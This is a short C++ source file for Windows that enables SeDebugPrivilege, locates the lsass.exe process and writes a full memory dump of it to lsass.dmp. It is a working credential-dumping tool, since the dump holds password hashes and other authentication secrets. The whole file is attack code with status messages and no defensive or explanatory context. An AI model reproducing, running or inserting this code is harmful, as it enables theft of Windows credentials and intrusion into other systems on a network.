#define SE_DEBUG_NAME TEXT("SeDebugPrivilege")

#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <tchar.h>
using namespace std;

BOOL EnableTokenPrivilege(LPCTSTR lpszPrivilege) {
	TOKEN_PRIVILEGES tp;
	BOOL bResult = FALSE;
	HANDLE hToken = NULL;
	DWORD dwSize;

	ZeroMemory(&tp, sizeof(tp));
	tp.PrivilegeCount = 1;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) &&
		LookupPrivilegeValue(NULL, lpszPrivilege, &tp.Privileges[0].Luid)) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, &dwSize);
	}
	CloseHandle(hToken);

	return bResult;
}


int main() {
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;
	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (!EnableTokenPrivilege(SE_DEBUG_NAME)) {
		return -1;
	}

	if (Process32First(snapshot, &processEntry)) {
			while (_wcsicmp(processName, L"lsass.exe") != 0) {
				Process32Next(snapshot, &processEntry);
				processName = processEntry.szExeFile;
				lsassPID = processEntry.th32ProcessID;
			}
			wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
		}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (isDumped) {
		cout << "[+] lsass dumped successfully!" << endl;
	}

	return 0;
}
